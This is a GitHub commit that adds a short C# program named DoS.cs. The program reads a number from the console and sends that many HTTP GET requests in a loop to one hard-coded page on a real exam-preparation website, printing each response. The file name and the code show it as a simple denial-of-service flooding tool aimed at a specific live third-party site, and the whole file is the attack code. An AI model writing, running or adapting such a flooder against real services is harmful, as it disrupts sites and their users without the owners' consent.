4167b4ecee6dc999874d594a7b93639dec82d2f1
manakant52 <156078540+manakant52@users.noreply.github.com>
2024-01-09 14:57:01 +0300

    Add files via upload

---
+++ DoS.cs
@@ -0,0 +1,38 @@
+﻿using System;
+using System.Net.Http;
+using System.Threading.Tasks;
+
+class Program
+{
+    static async Task Main()
+    {
+        Console.WriteLine("Введите количество запросов:");
+
+        // Читаем количество запросов, указанное пользователем
+        int requestCount = int.Parse(Console.ReadLine());
+
+        // Создаем экземпляр HttpClient
+        using (HttpClient client = new HttpClient())
+        {
+            try
+            {
+                // Отправляем указанное количество запросов
+                for (int i = 0; i < requestCount; i++)
+                {
+                    HttpResponseMessage response = await client.GetAsync("https://en-ege.sdamgia.ru/test?id=2588500");
+
+
+                    // Получаем ответ в виде строки
+                    string responseBody = await response.Content.ReadAsStringAsync();
+
+                    // Выводим ответ на экран
+                    Console.WriteLine($"Response {i + 1}: {responseBody}");
+                }
+            }
+            catch (HttpRequestException ex)
+            {
+                Console.WriteLine($"Ошибка при выполнении запроса: {ex.Message}");
+            }
+        }
+    }
+}
